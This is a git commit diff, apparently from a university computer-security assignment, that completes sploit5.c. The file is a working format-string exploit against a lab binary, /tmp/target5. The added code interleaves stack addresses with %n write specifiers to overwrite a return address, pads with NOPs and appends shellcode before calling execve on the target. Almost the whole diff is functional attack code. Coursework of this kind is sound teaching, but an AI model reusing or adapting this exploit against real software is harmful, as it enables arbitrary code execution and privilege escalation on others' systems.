870ee93e4babcec66d11efbe50c11334697796a6
Wei Shi <weishi@stanford.edu>
2013-04-21 20:42:28 -0700

    Finished 5

--- sploits/sploit5.c
+++ sploits/sploit5.c
@@ -5,17 +5,37 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target5"
+#define PAYLOAD_SIZE (400)
+#define NOP (0x90)
+#define RET_ADDR (0xbffffc28)
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+    char *args[3];
+    char *env[1];
+    char payload[PAYLOAD_SIZE];
+    char *fmt;
+    char *fmtest;
+    /* Build payload */
+    memset(payload, NOP, PAYLOAD_SIZE);
+    payload[PAYLOAD_SIZE-1] = '\0';
+    fmt = "\xff\xff\xff\xff\xac\xfc\xff\xbf"
+          "\xff\xff\xff\xff\xad\xfc\xff\xbf"
+          "\xff\xff\xff\xff\xae\xfc\xff\xbf"
+          "\xff\xff\xff\xff\xaf\xfc\xff\xbf"
+          "%08X%08X%08X"
+          "%215u%n%240u%n%256u%n%192u%n";
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
-  env[0] = NULL;
+    memcpy(payload, fmt, strlen(fmt));
+    memcpy(payload + PAYLOAD_SIZE - strlen(shellcode) - 4, shellcode, strlen(shellcode));
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+    args[0] = TARGET;
+    args[1] = payload;
+    args[2] = NULL;
+    env[0] = NULL;
 
-  return 0;
+    if (0 > execve(TARGET, args, env))
+        fprintf(stderr, "execve failed.\n");
+
+    return 0;
 }
